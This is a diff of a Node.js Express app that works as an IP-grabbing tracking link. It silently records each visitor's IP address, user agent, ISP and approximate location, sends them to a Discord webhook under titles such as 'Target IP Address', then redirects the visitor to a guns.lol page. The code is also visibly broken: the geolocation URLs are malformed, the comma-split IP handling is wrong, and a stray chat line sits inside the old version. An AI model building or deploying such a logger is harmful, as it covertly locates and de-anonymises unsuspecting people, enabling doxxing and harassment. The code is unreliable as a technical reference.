@@ -1,90 +1,68 @@
 const express = require('express');
+const axios = require('axios');
 const app = express();
-const PORT = process.env.PORT || 3000;
 
-// Update this to your own personal guns.lol page url
-const REDIRECT_URL = 'https://guns.lol/xsaint';
+// Pulls safely from your Render environment configuration
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
+const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol'; 
 
-app.get('/', async (req, res) => {
-    // 1. Fallback redirect safety net
-    let redirected = false;
-    const safeRedirect = () => {
-        if (!redirected) {
-            redirected = true;
-            res.redirect(REDIRECT_URL);
-        }
-    };
-
-    try {
-        const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
-// Split by comma, take the first IP, remove all spaces, and clean up any hidden characters
-let userIp = rawIp.split(',')[0].trim().replace(/[^0-9a-fA-F.:]/g, '');
-
-if (!userIp) {
-    userIp = '8.8.8.8';
-}
-
-Send a message...
-
-// Localhost safety check for locronment testing
-        if (userIp === '::1' || userIp === '::ffff:127.0.0.1') {
-            userIp = '8.8.8.8'; // Mock IP (Google DNS) for local testing purposes
-        }
-
-        // 3. Fetch location and broadband provider (ISP) data from ip-api
-        let locationText = "Unknown Location";
-        let broadbandText = "Unknown ISP";
-
-        try {
-            // FIXED: Uses secure string concatenation to completely avoid template literal/quote bugs
-            const geoRes = await fetch('http://ip-api.com' + userIp + '?fields=status,country,regionName,city,isp');
-            const geoData = await geoRes.json();
-            
-            if (geoData.status === 'success') {
-                // FIXED: Uses proper backticks so data resolves into actual words
-                locationText = `${geoData.city}, ${geoData.regionName}, ${geoData.country}`;
-                broadbandText = geoData.isp;
-            }
-        } catch (geoError) {
-            console.error("Geolocation API error:", geoError);
-        }
-
-        // 4. Construct a beautiful Discord Embed message
-        const discordPayload = {
-            embeds: [{
-                title: "🌐 New Connection Tracked!",
-                color: 3447003, // Premium Blue colour profile
-                fields: [
-                    { name: "🎯 Target IP Address", value: `\`${userIp}\``, inline: true },
-                    { name: "📶 Broadband Provider / ISP", value: broadbandText, inline: true },
-                    { name: "📍 Approximate Location", value: locationText, inline: false },
-                    { name: "🖥️ User Agent (Device)", value: req.headers['user-agent'] || "Unknown Device", inline: false }
-                ],
-                timestamp: new Date().toISOString(),
-                footer: { text: "Render Logger • Educational System" }
-            }]
-        };
-
-        // 5. Send webhook payload data if the URL is configured in Render
-        if (process.env.DISCORD_WEBHOOK_URL) {
-            await fetch(process.env.DISCORD_WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(discordPayload)
-            });
-        } else {
-            console.log("Missing DISCORD_WEBHOOK_URL in environment settings.");
-            console.log("Logged Data:", { userIp, broadbandText, locationText });
-        }
-
-    } catch (error) {
-        console.error("Critical routing error:", error);
-    } finally {
-        // 6. Ensure the target is always bounced away to your endpoint safely
-        safeRedirect();
+app.get('/visit', async (req, res) => {
+    // 1. Extract visitor IP address
+    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    
+    if (clientIp && clientIp.includes(',')) {
+        clientIp = clientIp.split(',').trim();
     }
+
+    // Local testing fallback
+    if (clientIp === '::1' || clientIp === '127.0.0.1') {
+        clientIp = '8.8.8.8'; 
+    }
+
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+
+    if (DISCORD_WEBHOOK_URL) {
+        try {
+            // 2. Query the GeoIP API
+            const geoResponse = await axios.get(`http://ip-api.com{clientIp}?fields=61439`);
+            const geoData = geoResponse.data;
+
+            // 3. Clean, Minimalist Red Embed
+            const discordPayload = {
+                embeds: [{
+                    title: "Visitor Logged",
+                    color: 15548997, // Discord Red Color
+                    description: `A user has accessed the tracking link.`,
+                    fields: [
+                        { name: "IP Address", value: `\`${clientIp}\``, inline: true },
+                        { name: "ISP Network", value: `\`${geoData.isp || "Unknown"}\``, inline: true },
+                        { name: "Location", value: `\`${geoData.city || "Unknown"}, ${geoData.country || "Unknown"}\``, inline: false },
+                        { name: "Device / Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false }
+                    ],
+                    footer: {
+                        text: "System Monitor"
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // 4. Send directly to your webhook
+            axios.post(DISCORD_WEBHOOK_URL, discordPayload).catch(err => {
+                console.error("Webhook Delivery Failed:", err.message);
+            });
+
+        } catch (error) {
+            console.error("Geo Data Retrieval Error:", error.message);
+        }
+    } else {
+        console.warn("Configuration Error: DISCORD_WEBHOOK variable is missing.");
+    }
+
+    // 5. Instantly redirect
+    res.redirect(302, REDIRECT_URL);
 });
 
+const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`Render Logger listening on port ${PORT}`);
+    console.log(`Server running on port ${PORT}`);
 });
